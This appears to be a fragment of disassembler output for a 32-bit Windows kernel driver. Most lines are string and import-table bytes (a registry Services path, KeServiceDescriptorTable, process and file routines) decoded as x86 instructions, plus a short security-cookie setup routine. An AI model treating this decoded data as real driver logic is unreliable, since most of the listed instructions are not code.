   1af3c:	arpl   WORD PTR [eax],ax
   1af3e:	pop    edi
   1af3f:	add    BYTE PTR [ebx],dh
   1af41:	add    BYTE PTR [edx],dh
   1af43:	add    BYTE PTR [eax],al
   1af45:	add    BYTE PTR [ebx+0x0],ch
   1af48:	add    BYTE PTR fs:[edx+0x0],dh
   1af4c:	arpl   WORD PTR [eax],ax
   1af4e:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
   1af53:	add    BYTE PTR [eax+eax*1+0x0],ch
   1af57:	add    BYTE PTR [edi+0x0],bl
   1af5a:	imul   eax,DWORD PTR [eax],0x5f006f
   1af60:	add    BYTE PTR gs:[esi+0x0],dh
   1af64:	add    BYTE PTR [eax],al
   1af66:	pop    edi
   1af67:	add    BYTE PTR [ecx+0x0],ch
   1af6a:	outs   dx,BYTE PTR ds:[esi]
   1af6b:	add    BYTE PTR [edi+0x0],bl
   1af6e:	add    BYTE PTR gs:[esi+0x0],dh
   1af72:	add    BYTE PTR [eax],al
   1af74:	pop    esp
   1af75:	add    BYTE PTR [edx+0x0],al
   1af78:	popa   
   1af79:	add    BYTE PTR [ebx+0x0],dh
   1af7c:	add    BYTE PTR gs:[esi+0x0],cl
   1af80:	popa   
   1af81:	add    BYTE PTR [ebp+0x0],ch
   1af84:	add    BYTE PTR gs:[eax+eax*1+0x4f],ah
   1af89:	add    BYTE PTR [edx+0x0],ah
   1af8c:	push   0x0
   1af8e:	add    BYTE PTR gs:[ebx+0x0],ah
   1af92:	je     0x1af94
   1af94:	jae    0x1af96
   1af96:	pop    esp
   1af97:	add    BYTE PTR [eax],al
   1af99:	add    BYTE PTR [eax+eax*1+0x6c],ah
   1af9d:	add    BYTE PTR [eax+eax*1+0x63],ch
   1afa1:	add    BYTE PTR [ecx+0x0],ah
   1afa4:	arpl   WORD PTR [eax],ax
   1afa6:	push   0x6500
   1afab:	add    BYTE PTR [edx],bh
   1afad:	add    BYTE PTR [eax],al
   1afaf:	add    BYTE PTR [eax+eax*1+0x64],bl
   1afb3:	add    BYTE PTR [edx+0x0],dh
   1afb6:	imul   eax,DWORD PTR [eax],0x650076
   1afbc:	jb     0x1afbe
   1afbe:	jae    0x1afc0
   1afc0:	pop    esp
   1afc1:	add    BYTE PTR [ebp+0x0],ah
   1afc4:	je     0x1afc6
   1afc6:	arpl   WORD PTR [eax],ax
   1afc8:	pop    esp
   1afc9:	add    BYTE PTR [eax+0x0],ch
   1afcc:	outs   dx,DWORD PTR ds:[esi]
   1afcd:	add    BYTE PTR [ebx+0x0],dh
   1afd0:	je     0x1afd2
   1afd2:	jae    0x1afd4
   1afd4:	add    BYTE PTR [eax],al
   1afd6:	pop    esp
   1afd7:	add    BYTE PTR [eax+eax*1+0x72],ah
   1afdb:	add    BYTE PTR [ecx+0x0],ch
   1afde:	jbe    0x1afe0
   1afe0:	add    BYTE PTR gs:[edx+0x0],dh
   1afe4:	jae    0x1afe6
   1afe6:	pop    esp
   1afe7:	add    BYTE PTR [eax],al
   1afe9:	add    BYTE PTR [esi+0x0],ch
   1afec:	je     0x1afee
   1afee:	outs   dx,DWORD PTR ds:[esi]
   1afef:	add    BYTE PTR [ebx+0x0],dh
   1aff2:	imul   eax,DWORD PTR [eax],0x72
   1aff5:	add    BYTE PTR [esi+0x0],ch
   1aff8:	ins    BYTE PTR es:[edi],dx
   1aff9:	add    BYTE PTR [esi],ch
   1affb:	add    BYTE PTR [ebp+0x0],ah
   1affe:	js     0x1b000
   1b000:	add    BYTE PTR gs:[eax],al
   1b003:	add    BYTE PTR [eax+eax*1+0x64],bl
   1b007:	add    BYTE PTR [eax+eax*1+0x6c],ch
   1b00b:	add    BYTE PTR [ebx+0x0],ah
   1b00e:	popa   
   1b00f:	add    BYTE PTR [ebx+0x0],ah
   1b012:	push   0x5c006500
   1b017:	add    BYTE PTR [eax],al
   1b019:	add    BYTE PTR ds:0x7500,ah
   1b01f:	add    BYTE PTR [esi+0x0],ch
   1b022:	je     0x1b024
   1b024:	data16 add BYTE PTR [ebx+0x0],dh
   1b028:	add    BYTE PTR [eax],al
   1b02a:	xor    BYTE PTR [eax],al
   1b02c:	pop    eax
   1b02d:	add    BYTE PTR [eax],al
   1b02f:	add    BYTE PTR [eax],dh
   1b031:	add    BYTE PTR [eax+0x0],bh
   1b034:	add    BYTE PTR [eax],al
   1b036:	inc    edx
   1b037:	add    BYTE PTR [eax+eax*1+0x49],cl
   1b03b:	add    BYTE PTR [esi+0x0],ch
   1b03e:	imul   eax,DWORD PTR [eax],0x74
   1b044:	pop    esp
   1b045:	add    BYTE PTR [edx+0x0],dl
   1b048:	add    BYTE PTR gs:[edi+0x0],ah
   1b04c:	imul   eax,DWORD PTR [eax],0x740073
   1b052:	jb     0x1b054
   1b054:	jns    0x1b056
   1b056:	pop    esp
   1b057:	add    BYTE PTR [ebp+0x0],cl
   1b05a:	popa   
   1b05b:	add    BYTE PTR [ebx+0x0],ah
   1b05e:	push   0x6e006900
   1b063:	add    BYTE PTR [ebp+0x0],ah
   1b066:	pop    esp
   1b067:	add    BYTE PTR [ebx+0x0],dl
   1b06a:	pop    ecx
   1b06b:	add    BYTE PTR [ebx+0x0],dl
   1b06e:	push   esp
   1b06f:	add    BYTE PTR [ebp+0x0],al
   1b072:	dec    ebp
   1b073:	add    BYTE PTR [eax+eax*1+0x43],bl
   1b077:	add    BYTE PTR [ebp+0x0],dh
   1b07a:	jb     0x1b07c
   1b07c:	jb     0x1b07e
   1b07e:	add    BYTE PTR gs:[esi+0x0],ch
   1b082:	je     0x1b084
   1b084:	inc    ebx
   1b085:	add    BYTE PTR [edi+0x0],ch
   1b088:	outs   dx,BYTE PTR ds:[esi]
   1b089:	add    BYTE PTR [eax+eax*1+0x72],dh
   1b08d:	add    BYTE PTR [edi+0x0],ch
   1b090:	ins    BYTE PTR es:[edi],dx
   1b091:	add    BYTE PTR [ebx+0x0],dl
   1b094:	add    BYTE PTR gs:[eax+eax*1+0x5c],dh
   1b099:	add    BYTE PTR [ebx+0x0],dl
   1b09c:	add    BYTE PTR gs:[edx+0x0],dh
   1b0a0:	jbe    0x1b0a2
   1b0a2:	imul   eax,DWORD PTR [eax],0x650063
   1b0a8:	jae    0x1b0aa
	...

Disassembly of section INIT:

0001df00 <INIT>:
   1df00:	add    BYTE PTR [eax],al
   1df02:	add    BYTE PTR [eax],al
   1df04:	add    BYTE PTR [eax],al
   1df06:	xor    eax,eax
   1df08:	ret    0x8
   1df0b:	int3   
   1df0c:	int3   
   1df0d:	int3   
   1df0e:	int3   
   1df0f:	int3   
   1df10:	mov    edi,edi
   1df12:	push   ebp
   1df13:	mov    ebp,esp
   1df15:	mov    eax,ds:0x1bb6c
   1df1a:	test   eax,eax
   1df1c:	mov    ecx,0xbb40e64e
   1df21:	je     0x1df27
   1df23:	cmp    eax,ecx
   1df25:	jne    0x1df45
   1df27:	mov    edx,DWORD PTR ds:0x1b270
   1df2d:	mov    eax,0x1bb6c
   1df32:	shr    eax,0x8
   1df35:	xor    eax,DWORD PTR [edx]
   1df37:	mov    ds:0x1bb6c,eax
   1df3c:	jne    0x1df45
   1df3e:	mov    eax,ecx
   1df40:	mov    ds:0x1bb6c,eax
   1df45:	not    eax
   1df47:	mov    ds:0x1bb70,eax
   1df4c:	pop    ebp
   1df4d:	jmp    0x1df06
   1df52:	int3   
   1df53:	int3   
   1df54:	mov    al,ds:0xdf
   1df59:	add    BYTE PTR [eax],al
   1df5b:	add    BYTE PTR [eax],al
   1df5d:	add    BYTE PTR [eax],al
   1df5f:	add    BYTE PTR [eax+ebp*8-0x4ef00000],cl
   1df66:	add    BYTE PTR [eax],al
   1df68:	nop
   1df69:	fild   WORD PTR [eax]
	...
   1df73:	add    dh,cl
   1df75:	call   0xb101df7a
	...
   1df8e:	add    BYTE PTR [eax],al
   1df90:	test   al,0xe8
   1df92:	add    BYTE PTR [eax],al
   1df94:	call   0xe8:0xc00000e8
   1df9b:	add    BYTE PTR [eax],al
   1df9d:	add    BYTE PTR [eax],al
   1df9f:	add    BYTE PTR [eax-0x1f],bh
   1dfa2:	add    BYTE PTR [eax],al
   1dfa4:	nop
   1dfa5:	loope  0x1dfa7
   1dfa7:	add    BYTE PTR [ecx+eiz*8-0x1e420000],ah
   1dfae:	add    BYTE PTR [eax],al
   1dfb0:	shl    cl,1
   1dfb2:	add    BYTE PTR [eax],al
   1dfb4:	in     al,0xe1
   1dfb6:	add    BYTE PTR [eax],al
   1dfb8:	mul    cl
   1dfba:	add    BYTE PTR [eax],al
   1dfbc:	or     al,0xe2
   1dfbe:	add    BYTE PTR [eax],al
   1dfc0:	sbb    dl,ah
   1dfc2:	add    BYTE PTR [eax],al
   1dfc4:	sub    al,0xe2
   1dfc6:	add    BYTE PTR [eax],al
   1dfc8:	cmp    al,0xe2
   1dfca:	add    BYTE PTR [eax],al
   1dfcc:	dec    esp
   1dfcd:	loop   0x1dfcf
   1dfcf:	add    BYTE PTR [eax-0x1e],ch
   1dfd2:	add    BYTE PTR [eax],al
   1dfd4:	jb     0x1dfb8
   1dfd6:	add    BYTE PTR [eax],al
   1dfd8:	mov    ah,dl
   1dfda:	add    BYTE PTR [eax],al
   1dfdc:	xchg   esp,eax
   1dfdd:	loop   0x1dfdf
   1dfdf:	add    BYTE PTR [esi-0x45ffff1e],bl
   1dfe5:	loop   0x1dfe7
   1dfe7:	add    dl,dl
   1dfe9:	loop   0x1dfeb
   1dfeb:	add    ah,bl
   1dfed:	loop   0x1dfef
   1dfef:	add    ah,dh
   1dff1:	loop   0x1dff3
   1dff3:	add    BYTE PTR [ebx+eiz*8],cl
   1dff6:	add    BYTE PTR [eax],al
   1dff8:	and    al,0xe3
   1dffa:	add    BYTE PTR [eax],al
   1dffc:	xor    bl,ah
   1dffe:	add    BYTE PTR [eax],al
   1e000:	cmp    ah,bl
   1e002:	add    BYTE PTR [eax],al
   1e004:	pop    esp
   1e005:	jecxz  0x1e007
   1e007:	add    BYTE PTR [edx-0x1d],bh
   1e00a:	add    BYTE PTR [eax],al
   1e00c:	xchg   esi,eax
   1e00d:	jecxz  0x1e00f
   1e00f:	add    BYTE PTR [edx-0x43ffff1d],dh
   1e015:	jecxz  0x1e017
   1e017:	add    dl,cl
   1e019:	jecxz  0x1e01b
   1e01b:	add    ah,ah
   1e01d:	jecxz  0x1e01f
   1e01f:	add    dl,dh
   1e021:	jecxz  0x1e023
   1e023:	add    ah,bh
   1e025:	jecxz  0x1e027
   1e027:	add    BYTE PTR [esi],al
   1e029:	in     al,0x0
   1e02b:	add    BYTE PTR [edx],bl
   1e02d:	in     al,0x0
   1e02f:	add    BYTE PTR [esi],dh
   1e031:	in     al,0x0
   1e033:	add    BYTE PTR [edx-0x1c],cl
   1e036:	add    BYTE PTR [eax],al
   1e038:	push   esp
   1e039:	in     al,0x0
   1e03b:	add    BYTE PTR [edx-0x1c],ch
   1e03e:	add    BYTE PTR [eax],al
   1e040:	and    ah,0x0
   1e043:	add    BYTE PTR [edx-0x55ffff1c],dl
   1e049:	in     al,0x0
   1e04b:	add    BYTE PTR [esi-0x2dffff1c],dh
   1e051:	in     al,0x0
   1e053:	add    BYTE PTR [edx-0x1f],ch
   1e056:	add    BYTE PTR [eax],al
   1e058:	or     ah,ch
   1e05a:	add    BYTE PTR [eax],al
   1e05c:	adc    al,0xe5
   1e05e:	add    BYTE PTR [eax],al
   1e060:	xor    al,0xe5
   1e062:	add    BYTE PTR [eax],al
   1e064:	push   eax
   1e065:	in     eax,0x0
   1e067:	add    BYTE PTR [eax-0x1b],ah
   1e06a:	add    BYTE PTR [eax],al
   1e06c:	ins    BYTE PTR es:[edi],dx
   1e06d:	in     eax,0x0
   1e06f:	add    BYTE PTR [edx-0x1b],bh
   1e072:	add    BYTE PTR [eax],al
   1e074:	mov    ah,ch
   1e076:	add    BYTE PTR [eax],al
   1e078:	call   0xe5:0xb20000e5
   1e07f:	add    al,cl
   1e081:	in     eax,0x0
   1e083:	add    al,bl
   1e085:	in     eax,0x0
   1e087:	add    al,dh
   1e089:	in     eax,0x0
   1e08b:	add    BYTE PTR [eax],cl
   1e08d:	out    0x0,al
   1e08f:	add    BYTE PTR [eax],ch
   1e091:	out    0x0,al
   1e093:	add    BYTE PTR [esi+eiz*8],bh
   1e096:	add    BYTE PTR [eax],al
   1e098:	inc    esi
   1e099:	out    0x0,al
   1e09b:	add    BYTE PTR [esi-0x1a],bl
   1e09e:	add    BYTE PTR [eax],al
   1e0a0:	and    dh,0x0
   1e0a3:	add    BYTE PTR [edx-0x4dffff1a],bl
   1e0a9:	out    0x0,al
   1e0ab:	add    dl,al
   1e0ad:	out    0x0,al
   1e0af:	add    dh,dl
   1e0b1:	out    0x0,al
   1e0b3:	add    al,ah
   1e0b5:	out    0x0,al
   1e0b7:	add    BYTE PTR [eax],al
   1e0b9:	out    0x0,eax
   1e0bb:	add    BYTE PTR [eax],bl
   1e0bd:	out    0x0,eax
   1e0bf:	add    BYTE PTR [esi],ah
   1e0c1:	out    0x0,eax
   1e0c3:	add    BYTE PTR [esi],ch
   1e0c5:	out    0x0,eax
   1e0c7:	add    BYTE PTR [esi-0x19],al
   1e0ca:	add    BYTE PTR [eax],al
   1e0cc:	push   esp
   1e0cd:	out    0x0,eax
   1e0cf:	add    BYTE PTR [edx-0x19],ah
   1e0d2:	add    BYTE PTR [eax],al
   1e0d4:	jl     0x1e0bd
   1e0d6:	add    BYTE PTR [eax],al
   1e0d8:	xchg   esp,eax
   1e0d9:	out    0x0,eax
   1e0db:	add    BYTE PTR [edi+eiz*8-0x183c0000],ah
   1e0e2:	add    BYTE PTR [eax],al
   1e0e4:	fsub   st,st(7)
   1e0e6:	add    BYTE PTR [eax],al
   1e0e8:	cli    
   1e0e9:	out    0x0,eax
   1e0eb:	add    BYTE PTR [eax],bl
   1e0ed:	call   0xe82fe0f2
   1e0f2:	add    BYTE PTR [eax],al
   1e0f4:	cmp    ch,al
   1e0f6:	add    BYTE PTR [eax],al
   1e0f8:	dec    esi
   1e0f9:	call   0xe859e0fe
   1e0fe:	add    BYTE PTR [eax],al
   1e100:	outs   dx,BYTE PTR ds:[esi]
   1e101:	call   0xe87de106
   1e106:	add    BYTE PTR [eax],al
   1e108:	push   esi
   1e109:	loope  0x1e10b
   1e10b:	add    BYTE PTR [eax],bh
   1e10d:	loope  0x1e10f
   1e10f:	add    dh,ch
   1e111:	in     al,0x0
   1e113:	add    BYTE PTR [eax],ah
   1e115:	loope  0x1e117
   1e117:	add    dh,dl
   1e119:	call   0x1e11e
   1e11e:	add    BYTE PTR [eax],al
   1e120:	sub    al,0x3
   1e122:	dec    edi
   1e123:	bound  esp,QWORD PTR [esi+0x44]
   1e126:	gs jb  0x1e18e
   1e129:	data16 gs jb 0x1e192
   1e12d:	outs   dx,BYTE PTR ds:[esi]
   1e12e:	arpl   WORD PTR [ebp+0x4f],sp
   1e131:	bound  ebp,QWORD PTR [edx+0x65]
   1e134:	arpl   WORD PTR [eax+eax*1+0x0],si
   1e138:	jns    0x1e13d
   1e13a:	push   eax
   1e13b:	jae    0x1e189
   1e13d:	outs   dx,DWORD PTR ds:[esi]
   1e13e:	outs   dx,DWORD PTR ds:[esi]
   1e13f:	imul   esi,DWORD PTR [ebp+0x70],0x50
   1e143:	jb     0x1e1b4
   1e145:	arpl   WORD PTR [ebp+0x73],sp
   1e148:	jae    0x1e18c
   1e14a:	jns    0x1e19c
   1e14c:	jb     0x1e1bd
   1e14e:	arpl   WORD PTR [ebp+0x73],sp
   1e151:	jae    0x1e19c
   1e153:	add    BYTE PTR fs:[eax],al
   1e156:	dec    esi
   1e157:	add    BYTE PTR [ebp+0x78],al
   1e15a:	inc    esi
   1e15b:	jb     0x1e1c2
   1e15d:	gs push eax
   1e15f:	outs   dx,DWORD PTR ds:[esi]
   1e160:	outs   dx,DWORD PTR ds:[esi]
   1e161:	ins    BYTE PTR es:[edi],dx
   1e162:	push   edi
   1e163:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0x53006761
   1e16b:	add    cl,BYTE PTR [ebx+0x65]
   1e16e:	push   ebx
   1e16f:	gs je  0x1e1b7
   1e172:	jbe    0x1e1d9
   1e174:	outs   dx,BYTE PTR ds:[esi]
   1e175:	je     0x1e177
   1e177:	add    BYTE PTR [edx+0x2],ch
   1e17a:	dec    ebx
   1e17b:	gs push edi
   1e17d:	popa   
   1e17e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
   1e186:	ins    BYTE PTR es:[di],dx
   1e188:	gs dec edi
   1e18a:	bound  ebp,QWORD PTR [edx+0x65]
   1e18d:	arpl   WORD PTR [eax+eax*1+0x23],si
   1e191:	add    cl,BYTE PTR [ebx+0x65]
   1e194:	dec    ecx
   1e195:	outs   dx,BYTE PTR ds:[esi]
   1e196:	jae    0x1e1fd
   1e198:	jb     0x1e20e
   1e19a:	push   ecx
   1e19b:	jne    0x1e202
   1e19d:	jne    0x1e204
   1e19f:	inc    esp
   1e1a0:	jo     0x1e205
   1e1a2:	add    BYTE PTR [eax],al
   1e1a4:	pop    ebx
   1e1a5:	add    cl,BYTE PTR [ebx+0x65]
   1e1a8:	push   ebx
   1e1a9:	gs je  0x1e200
   1e1ac:	popa   
   1e1ad:	jb     0x1e216
   1e1af:	gs je  0x1e202
   1e1b2:	jb     0x1e223
   1e1b4:	arpl   WORD PTR [ebp+0x73],sp
   1e1b7:	jae    0x1e228
   1e1b9:	jb     0x1e1ff
   1e1bb:	jo     0x1e220
   1e1bd:	add    BYTE PTR [edx+eax*1],dl
   1e1c0:	dec    ebx
   1e1c1:	gs dec ecx
   1e1c3:	outs   dx,BYTE PTR ds:[esi]
   1e1c4:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
   1e1cc:	inc    esp
   1e1cd:	jo     0x1e232
   1e1cf:	add    BYTE PTR ds:0x49654b02,dl
   1e1d5:	outs   dx,BYTE PTR ds:[esi]
   1e1d6:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
   1e1de:	inc    ebp
   1e1df:	jbe    0x1e246
   1e1e1:	outs   dx,BYTE PTR ds:[esi]
   1e1e2:	je     0x1e1e4
   1e1e4:	add    BYTE PTR ds:[ebp+0x78],al
   1e1e8:	inc    ecx
   1e1e9:	ins    BYTE PTR es:[edi],dx
   1e1ea:	ins    BYTE PTR es:[edi],dx
   1e1eb:	outs   dx,DWORD PTR ds:[esi]
   1e1ec:	arpl   WORD PTR [ecx+0x74],sp
   1e1ef:	gs push eax
   1e1f1:	outs   dx,DWORD PTR ds:[esi]
   1e1f2:	outs   dx,DWORD PTR ds:[esi]
   1e1f3:	ins    BYTE PTR es:[edi],dx
   1e1f4:	add    BYTE PTR [eax],al
   1e1f6:	sub    BYTE PTR [edx],al
   1e1f8:	dec    ebx
   1e1f9:	gs dec esi
   1e1fb:	jne    0x1e26a
   1e1fd:	bound  esp,QWORD PTR [ebp+0x72]
   1e200:	push   eax
   1e201:	jb     0x1e272
   1e203:	arpl   WORD PTR [ebp+0x73],sp
   1e206:	jae    0x1e277
   1e208:	jb     0x1e27d
   1e20a:	add    BYTE PTR [eax],al
   1e20c:	mov    ecx,0x776f7405
   1e211:	jne    0x1e283
   1e213:	jo     0x1e27a
   1e215:	jb     0x1e217
   1e217:	add    BYTE PTR [edx+0x496d4d02],ah
   1e21d:	jae    0x1e260
   1e21f:	fs fs jb 0x1e288
   1e223:	jae    0x1e298
   1e225:	push   esi
   1e226:	popa   
   1e227:	ins    BYTE PTR es:[edi],dx
   1e228:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x72500340
   1e230:	outs   dx,DWORD PTR ds:[esi]
   1e231:	bound  esp,QWORD PTR [ebp+0x46]
   1e234:	outs   dx,DWORD PTR ds:[esi]
   1e235:	jb     0x1e289
   1e237:	gs popa 
   1e239:	add    BYTE PTR fs:[eax],al
   1e23c:	inc    ecx
   1e23d:	add    edx,DWORD PTR [eax+0x72]
   1e240:	outs   dx,DWORD PTR ds:[esi]
   1e241:	bound  esp,QWORD PTR [ebp+0x46]
   1e244:	outs   dx,DWORD PTR ds:[esi]
   1e245:	jb     0x1e29e
   1e247:	jb     0x1e2b2
   1e249:	je     0x1e2b0
   1e24b:	add    BYTE PTR [ebp+eax*1+0x5a],cl
   1e24f:	ja     0x1e2a2
   1e251:	jne    0x1e2b8
   1e253:	jb     0x1e2ce
   1e255:	push   ebx
   1e256:	jns    0x1e2cb
   1e258:	je     0x1e2bf
   1e25a:	ins    DWORD PTR es:[edi],dx
   1e25b:	dec    ecx
   1e25c:	outs   dx,BYTE PTR ds:[esi]
   1e25d:	outs   dx,WORD PTR ds:[esi]
   1e25f:	jb     0x1e2ce
   1e261:	popa   
   1e262:	je     0x1e2cd
   1e264:	outs   dx,DWORD PTR ds:[esi]
   1e265:	outs   dx,BYTE PTR ds:[esi]
   1e266:	add    BYTE PTR [eax],al
   1e268:	mov    ah,0x5
   1e26a:	jae    0x1e2e0
   1e26c:	jb     0x1e2e1
   1e26e:	je     0x1e2e2
   1e270:	add    BYTE PTR [eax],al
   1e272:	call   0x6c76347a
   1e277:	inc    ebp
   1e278:	jno    0x1e2ef
   1e27a:	popa   
   1e27b:	ins    BYTE PTR es:[edi],dx
   1e27c:	push   ebp
   1e27d:	outs   dx,BYTE PTR ds:[esi]
   1e27e:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   1e285:	jb     0x1e2f0
   1e287:	outs   dx,BYTE PTR ds:[esi]
   1e288:	add    BYTE PTR [bp+0x7705],bh
   1e28d:	arpl   WORD PTR [ebx+0x63],si
   1e290:	push   0xa3000072
   1e295:	add    eax,0x636d656d
   1e29a:	jo     0x1e315
   1e29c:	add    BYTE PTR [eax],al
   1e29e:	inc    ebx
   1e29f:	add    eax,0x7551775a
   1e2a4:	gs jb  0x1e320
   1e2a7:	dec    ecx
   1e2a8:	outs   dx,BYTE PTR ds:[esi]
   1e2a9:	outs   dx,WORD PTR ds:[esi]
   1e2ab:	jb     0x1e31a
   1e2ad:	popa   
   1e2ae:	je     0x1e319
   1e2b0:	outs   dx,DWORD PTR ds:[esi]
   1e2b1:	outs   dx,BYTE PTR ds:[esi]
   1e2b2:	push   eax
   1e2b3:	jb     0x1e324
   1e2b5:	arpl   WORD PTR [ebp+0x73],sp
   1e2b8:	jae    0x1e2ba
   1e2ba:	dec    edi
   1e2bb:	add    edx,DWORD PTR [eax+0x73]
   1e2be:	inc    edi
   1e2bf:	gs je  0x1e305
   1e2c2:	jne    0x1e336
   1e2c4:	jb     0x1e32b
   1e2c6:	outs   dx,BYTE PTR ds:[esi]
   1e2c7:	je     0x1e319
   1e2c9:	jb     0x1e33a
   1e2cb:	arpl   WORD PTR [ebp+0x73],sp
   1e2ce:	jae    0x1e319
   1e2d0:	add    BYTE PTR fs:[ebp+0x6d656d05],ah
   1e2d7:	jae    0x1e33e
   1e2d9:	je     0x1e2db
   1e2db:	add    BYTE PTR [ebx+0x0],bh
   1e2de:	inc    ebp
   1e2df:	js     0x1e333
   1e2e1:	gs ins BYTE PTR es:[edi],dx
   1e2e3:	gs popa 
   1e2e5:	jae    0x1e34c
   1e2e7:	push   edx
   1e2e8:	gs jae 0x1e35a
   1e2eb:	jne    0x1e35f
   1e2ed:	arpl   WORD PTR [ebp+0x4c],sp
   1e2f0:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x745203c3
   1e2f8:	ins    BYTE PTR es:[edi],dx
   1e2f9:	inc    ebx
   1e2fa:	outs   dx,DWORD PTR ds:[esi]
   1e2fb:	jo     0x1e376
   1e2fd:	push   ebp
   1e2fe:	outs   dx,BYTE PTR ds:[esi]
   1e2ff:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   1e306:	jb     0x1e371
   1e308:	outs   dx,BYTE PTR ds:[esi]
   1e309:	add    BYTE PTR [bx+si],al
   1e30c:	sbb    DWORD PTR [edx+edx*2],eax
   1e30f:	je     0x1e37d
   1e311:	dec    ecx
   1e312:	outs   dx,BYTE PTR ds:[esi]
   1e313:	imul   esi,DWORD PTR [ebp+edx*2+0x6e],0x646f6369
   1e31b:	gs push ebx
   1e31d:	je     0x1e391
   1e31f:	imul   ebp,DWORD PTR [esi+0x67],0x5920000
   1e326:	pop    edi
   1e327:	ja     0x1e38c
   1e329:	jae    0x1e394
   1e32b:	arpl   WORD PTR [ebp+0x70],bp
   1e32e:	add    BYTE PTR [eax],al
   1e330:	mov    BYTE PTR ds:0x72736377,0x63
   1e337:	push   0x370072
   1e33c:	inc    ebp
   1e33d:	js     0x1e380
   1e33f:	arpl   WORD PTR [ecx+0x75],si
   1e342:	imul   esi,DWORD PTR [edx+0x65],0x6f736552
   1e349:	jne    0x1e3bd
   1e34b:	arpl   WORD PTR [ebp+0x45],sp
   1e34e:	js     0x1e3b3
   1e350:	ins    BYTE PTR es:[edi],dx
   1e351:	jne    0x1e3c6
   1e353:	imul   esi,DWORD PTR [esi+0x65],0x6574694c
   1e35a:	add    BYTE PTR [eax],al
   1e35c:	cmp    BYTE PTR [eax],al
   1e35e:	inc    ebp
   1e35f:	js     0x1e3a2
   1e361:	arpl   WORD PTR [ecx+0x75],si
   1e364:	imul   esi,DWORD PTR [edx+0x65],0x6f736552
   1e36b:	jne    0x1e3df
   1e36d:	arpl   WORD PTR [ebp+0x53],sp
   1e370:	push   0x64657261
   1e375:	dec    esp
   1e376:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x6d4d029e
   1e37e:	inc    edi
   1e37f:	gs je  0x1e3d5
   1e382:	jns    0x1e3f7
   1e384:	je     0x1e3eb
   1e386:	ins    DWORD PTR es:[edi],dx
   1e387:	push   edx
   1e388:	outs   dx,DWORD PTR ds:[esi]
   1e389:	jne    0x1e3ff
   1e38b:	imul   ebp,DWORD PTR [esi+0x65],0x72646441
   1e392:	gs jae 0x1e408
   1e395:	add    BYTE PTR [edi+0x2],cl
   1e398:	dec    ebx
   1e399:	gs push ebx
   1e39b:	gs jb  0x1e414
   1e39e:	imul   esp,DWORD PTR [ebx+0x65],0x63736544
   1e3a5:	jb     0x1e410
   1e3a7:	jo     0x1e41d
   1e3a9:	outs   dx,DWORD PTR ds:[esi]
   1e3aa:	jb     0x1e400
   1e3ac:	popa   
   1e3ad:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
   1e3b1:	add    BYTE PTR [edi],al
   1e3b3:	add    eax,0x6c43775a
   1e3b8:	outs   dx,DWORD PTR ds:[esi]
   1e3b9:	jae    0x1e420
   1e3bb:	add    BYTE PTR [edi+0x5],cl
   1e3be:	pop    edx
   1e3bf:	ja     0x1e413
   1e3c1:	gs popa 
   1e3c3:	fs inc esi
   1e3c5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5a054100
   1e3cd:	ja     0x1e420
   1e3cf:	jne    0x1e436
   1e3d1:	jb     0x1e44c
   1e3d3:	dec    ecx
   1e3d4:	outs   dx,BYTE PTR ds:[esi]
   1e3d5:	outs   dx,WORD PTR ds:[esi]
   1e3d7:	jb     0x1e446
   1e3d9:	popa   
   1e3da:	je     0x1e445
   1e3dc:	outs   dx,DWORD PTR ds:[esi]
   1e3dd:	outs   dx,BYTE PTR ds:[esi]
   1e3de:	inc    esi
   1e3df:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5a052b00
   1e3e7:	ja     0x1e438
   1e3e9:	jo     0x1e450
   1e3eb:	outs   dx,BYTE PTR ds:[esi]
   1e3ec:	inc    esi
   1e3ed:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x7705c300
   1e3f5:	arpl   WORD PTR [ebx+0x6e],si
   1e3f8:	arpl   WORD PTR [ecx+0x74],sp
   1e3fb:	add    ch,al
   1e3fd:	add    eax,0x6e736377
   1e402:	arpl   WORD PTR [eax+0x79],si
   1e405:	add    BYTE PTR [edx],ah
   1e407:	add    ecx,DWORD PTR [edi+0x62]
   1e40a:	push   ecx
   1e40b:	jne    0x1e472
   1e40d:	jb     0x1e488
   1e40f:	dec    esi
   1e410:	popa   
   1e411:	ins    DWORD PTR es:[edi],dx
   1e412:	gs push ebx
   1e414:	je     0x1e488
   1e416:	imul   ebp,DWORD PTR [esi+0x67],0x4f032400
   1e41d:	bound  edx,QWORD PTR [edx+0x65]
   1e420:	data16 gs jb 0x1e489
   1e424:	outs   dx,BYTE PTR ds:[esi]
   1e425:	arpl   WORD PTR [ebp+0x4f],sp
   1e428:	bound  ebp,QWORD PTR [edx+0x65]
   1e42b:	arpl   WORD PTR [edx+eax*2+0x79],si
   1e42f:	dec    eax
   1e430:	popa   
   1e431:	outs   dx,BYTE PTR ds:[esi]
   1e432:	fs ins BYTE PTR es:[edi],dx
   1e434:	add    BYTE PTR gs:[edx+0x1],bl
   1e438:	dec    ecx
   1e439:	outs   dx,DWORD PTR ds:[esi]
   1e43a:	inc    esi
   1e43b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4f],0x63656a62
   1e443:	je     0x1e499
   1e445:	jns    0x1e4b7
   1e447:	add    BYTE PTR gs:[eax],al
   1e44a:	mov    cl,0x5
   1e44c:	jae    0x1e4c2
   1e44e:	jb     0x1e4be
   1e450:	arpl   WORD PTR [eax+0x79],si
   1e453:	add    BYTE PTR [edi+0x1],ah
   1e456:	dec    ecx
   1e457:	outs   dx,DWORD PTR ds:[esi]
   1e458:	inc    edi
   1e459:	gs je  0x1e49f
   1e45c:	jne    0x1e4d0
   1e45e:	jb     0x1e4c5
   1e460:	outs   dx,BYTE PTR ds:[esi]
   1e461:	je     0x1e4b3
   1e463:	jb     0x1e4d4
   1e465:	arpl   WORD PTR [ebp+0x73],sp
   1e468:	jae    0x1e46a
   1e46a:	add    al,0x2
   1e46c:	dec    ebx
   1e46d:	gs inc edi
